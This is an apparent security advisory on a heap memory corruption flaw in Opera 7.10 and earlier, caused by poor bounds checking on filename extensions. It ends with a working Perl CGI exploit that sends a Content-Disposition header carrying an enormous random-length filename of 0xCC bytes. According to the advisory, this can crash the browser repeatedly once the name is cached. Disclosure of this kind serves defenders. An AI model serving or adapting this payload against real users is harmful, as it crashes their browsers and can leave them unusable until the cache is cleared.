source: http://www.securityfocus.com/bid/7450/info

A vulnerability has been reported for Opera versions 7.10 and earlier. The problem is said to occur due to insufficient bounds checking on filename extensions. As a result, it may be possible for an attacker to corrupt heap-based memory.

Successful exploitation of this vulnerability may result in a denial of service, possibly prolonged. If a malicious filename entry were placed in a cache file, Opera may continuously crash until the cache file has been deleted.

#!/usr/bin/perl
# Smash Heap Memory.
# This script is CGI program.

$|=1;
my $filename = "." . "\xCC" x (int(rand(0x20000)) + 0x100);

print "Content-type: text/html\r\n";
print qq~Content-Disposition: filename="$filename"\r\n~;
print "\r\n";
print "<html><body>Love & Peace :)</body></html>\r\n";